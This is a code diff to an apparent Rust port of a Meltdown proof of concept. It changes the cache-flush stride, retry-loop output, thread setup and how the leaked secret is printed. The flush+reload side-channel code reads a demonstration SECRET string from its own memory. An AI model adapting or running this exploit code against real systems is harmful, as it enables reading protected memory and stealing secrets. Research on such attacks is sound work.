@@ -148,6 +148,7 @@ pub fn handle_signal() {
 pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
 	//println!("Called libkdump_read_signal_handler for pointer {:?}", pointer);
 	for iteration in 0..config.retries {
+		print!(" {}\033[1D", iteration % 10);
 		unsafe {
 			if setjmp(&mut *jump_buf.lock()) == 0 {
 				meltdown_fast(mem, pointer);
@@ -302,31 +303,32 @@ pub fn main() {
 	}
 	
 	// Cache line granularity is probably 64 bytes, therefore we step by 64 to flush the entire memory. Stepping by 4K is probably also enough, as we only access the first byte of each page, TODO check
-	for i in (0..total_memory).step_by(64) {
+	for i in (0..total_memory).step_by(page_size) {
 		unsafe {
 			flush(ptr.add(i) as *const MemoryPage);
 		}
 	}
 	
-	println!("Current CPU time: {}", rdtsc());
-	let cache_miss_threshold = detect_flush_reload_threshold(&mem[0] as *const MemoryPage);
-	
-	let mut index: usize = 0;
-	println!("Secret {} at address {:?}", SECRET, SECRET.as_ptr());
-	
-	for i in 0..3 {
+	for i in 0..0 {
 		// TODO: Find out why load threads are used in the original
 		// TODO: Do we really need load threads?
 		thread::create(nop_thread);
 		println!("Started nop_thread {}!", i);
 	}
 	
+	println!("Current CPU time: {}", rdtsc());
+	let cache_miss_threshold = detect_flush_reload_threshold(&mem[0] as *const MemoryPage);
+	
+	let mut index: usize = 0;
+	print!("Secret {} at address {:?}\nGot: ", SECRET, SECRET.as_ptr());
+	
 	while index < SECRET.len() {
 		let pointer = SECRET[index..index].as_ptr();
 		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, pointer);
-		unsafe {
+		print!("{}", value);
+		/*unsafe {
 			println!("Got value at address {:?}: {} real: {}", pointer, value, *pointer);
-		}
+		}*/
 		index += 1;
 	}
 	
